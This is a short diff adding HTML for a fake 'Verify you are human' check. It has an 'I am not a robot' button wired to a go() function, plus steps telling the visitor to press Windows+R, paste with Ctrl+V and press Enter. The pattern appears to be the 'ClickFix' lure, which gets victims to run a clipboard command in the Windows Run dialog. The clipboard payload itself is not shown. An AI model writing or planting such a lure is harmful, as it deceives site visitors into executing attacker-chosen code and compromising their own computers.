@@ -1,0 +1,3 @@
+<p>Verify you are human</p><button onclick="go()">I am not a robot</button>
+<ol><li>Press Windows key + R</li><li>Press Ctrl + V</li><li>Then press Enter</li></ol>
+
